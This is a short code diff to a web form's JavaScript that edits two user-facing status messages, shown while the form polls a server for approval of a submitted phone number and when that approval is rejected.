@@ -254,7 +254,7 @@ document.getElementById('detailsForm').addEventListener('submit', async e => {
         localStorage.setItem('phone', phone);
 
         // Show waiting status with spinner
-        showStatus('⏳ Waiting for admin approval...', 'waiting');
+        showStatus('⏳ Waiting for  approval...', 'waiting');
 
         // ---------------- POLLING ----------------
         const poll = setInterval(async () => {
@@ -280,7 +280,7 @@ document.getElementById('detailsForm').addEventListener('submit', async e => {
                 // ❌ REJECTED → STAY HERE
                 if (d.approved === false) {
                     clearInterval(poll);
-                    showStatus('❌ Request rejected. Please try again.', 'error');
+                    showStatus('❌ Request rejected. Please check your number and try again.', 'error');
                     nextBtn.disabled = false;
                     nextBtn.textContent = "Log in";
                 }
